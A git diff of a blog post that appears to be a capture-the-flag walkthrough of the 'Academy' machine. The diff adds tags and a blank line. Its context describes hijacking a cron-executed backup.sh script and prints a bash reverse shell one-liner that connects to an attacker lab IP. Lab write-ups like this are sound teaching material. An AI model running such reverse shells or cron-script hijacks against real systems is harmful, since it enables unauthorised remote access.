@@ -3,7 +3,7 @@ layout: post
 title: Academy - Walkthrough
 date: 2024-01-11 19:53 +0100
 categories: [CTF, Others]
-tags: [nmap,ftp,http,ffuf,linux,privilege escalation,linpeas,hashcat]
+tags: [nmap,ftp,http,ffuf,linux,privilege escalation,linpeas,hashcat,cronjob,pspy]
 ---
 
 # Summary
@@ -335,6 +335,7 @@ From the result, we can see that the backup script is executed by a cron job in 
 We will abuse this to gain a reverse shell by replacing the commands in the `backup.sh` script with a bash reverse shell one liner command. So once the backup script is executed again in the background, we should get a reverse shell on our attacker machine.
 
 > Add this one liner command to replace the command in **backup.sh**
+
 ```bash
 bash -i >& /dev/tcp/10.0.2.18/8080 0>&1
 ```
